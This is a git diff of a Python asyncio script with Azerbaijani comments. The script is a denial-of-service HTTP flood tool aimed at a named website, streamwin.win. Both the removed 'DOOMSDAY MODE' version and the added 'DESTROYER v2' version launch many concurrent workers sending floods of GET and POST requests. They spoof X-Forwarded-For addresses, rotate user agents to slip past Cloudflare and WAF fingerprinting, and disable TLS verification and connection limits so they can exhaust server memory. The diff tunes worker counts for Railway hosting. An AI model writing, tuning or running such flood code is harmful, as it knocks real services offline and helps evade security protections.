@@ -2,75 +2,64 @@ import asyncio
 import httpx
 import random
 import string
-import ssl
 
-# --- EXTREME TARGET ---
+# --- OPTİMALLAŞDIRILMIŞ GÜC ---
 TARGET_URL = "https://streamwin.win"
-WORKERS = 250         # Railway limitlərini sona qədər zorlayırıq
-BATCH_SIZE = 120      # Hər worker eyni anda 120 "öldürücü" stream yaradır
+WORKERS = 60           # Railway-də donmaması üçün 60-70 arası ideal dır
+BATCH_SIZE = 40        # Hər worker eyni anda 40 sürətli paket atsın
 
-def gen_garbage(n=15):
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
+def gen_str(n=10):
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
-async def doomsday_worker(worker_id, client):
-    # Modern brauzerlərin ən son fingerprint-lərini təqlid edirik
-    u_agents = [
-        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
-    ]
-    
+async def attack_logic(worker_id, client):
+    print(f"[*] Worker {worker_id} hücuma hazır!")
     while True:
         try:
+            # Cloudflare-in TLS fingerprint-ini (JA3) çaşdırmaq üçün hər dəfə yeni başlıqlar
             headers = {
-                "User-Agent": random.choice(u_agents),
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
-                "Accept-Language": "en-US,en;q=0.9",
-                "Cache-Control": "no-store, no-cache, max-age=0",
-                "TE": "trailers",
-                "X-Requested-With": "XMLHttpRequest",
+                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(120,126)}.0.0.0 Safari/537.36",
+                "Accept": "*/*",
+                "Accept-Encoding": "gzip, deflate, br",
                 "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
-                # Bu başlıqlar WAF-ı içəridən yormaq üçün "junk" məlumatlarla doldurulur
-                "X-Custom-Fuzz": gen_garbage(500), 
-                "Cookie": f"cf_clearance={gen_garbage(40)}; csrftoken={gen_garbage(32)}"
+                "X-Requested-With": "XMLHttpRequest",
+                "Cache-Control": "no-cache"
             }
 
-            # Dinamik URL + Path Fuzzing
-            paths = ["/api/v3/feed", "/search", "/ru/azerbaijan", "/api/v2/items"]
-            url = f"{TARGET_URL}{random.choice(paths)}?{gen_garbage(5)}={gen_garbage(20)}&debug=true"
-
-            # HTTP/2 Rapid Reset & Flood
+            # Serverin daxili axtarış motoruna və ağır API-lərinə müraciət
+            url = f"{TARGET_URL}/?s={gen_str(15)}&id={random.randint(1,99999)}"
+            
+            # Sürətli paket dalğası (Rapid Flood)
             tasks = []
             for _ in range(BATCH_SIZE):
-                # Həm GET, həm də ağır Payload-lu POST göndəririk
-                if _ % 2 == 0:
-                    tasks.append(client.get(url, headers=headers))
+                # Həm GET (keş keçmək üçün), həm də POST (RAM doldurmaq üçün)
+                if _ % 3 == 0:
+                    tasks.append(client.post(url, headers=headers, json={"data": gen_str(200)}))
                 else:
-                    payload = {gen_garbage(5): gen_garbage(200) for _ in range(10)}
-                    tasks.append(client.post(url, headers=headers, json=payload))
-
-            # Bütün asinxron sorğuları eyni anda serverin üzərinə buraxırıq
+                    tasks.append(client.get(url, headers=headers))
+            
+            # Dalğanı burax!
             await asyncio.gather(*tasks, return_exceptions=True)
-
-        except Exception:
+            
+            # Kiçik bir boşluq (Railway-in çökməməsi üçün çox vacibdir)
             await asyncio.sleep(0.01)
 
+        except Exception:
+            await asyncio.sleep(0.5)
+
 async def main():
-    print(f"💀 DOOMSDAY MODE ACTIVATED: {TARGET_URL}")
-    print(f"[*] Power Level: {WORKERS} Workers | {BATCH_SIZE} Batch Size")
+    print(f"💀 DESTROYER v2 ACTIVATED: {TARGET_URL}")
     
     # TCP səviyyəsində bağlantı limitlərini ləğv edirik
     limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
     
     async with httpx.AsyncClient(
-        http2=True,          # HTTP/2 hökməndir (Bypass üçün)
-        verify=False,        # SSL yoxlamasını keç (Sürət üçün)
-        limits=limits,
-        timeout=None         # Server cavab verməsə də bağlantını kəsmə
+        http2=True, 
+        verify=False, 
+        limits=limits, 
+        timeout=10.0
     ) as client:
         
-        # Worker-ləri birbaşa işə salırıq
-        workers = [doomsday_worker(i, client) for i in range(WORKERS)]
+        workers = [attack_logic(i, client) for i in range(WORKERS)]
         await asyncio.gather(*workers)
 
 if __name__ == "__main__":
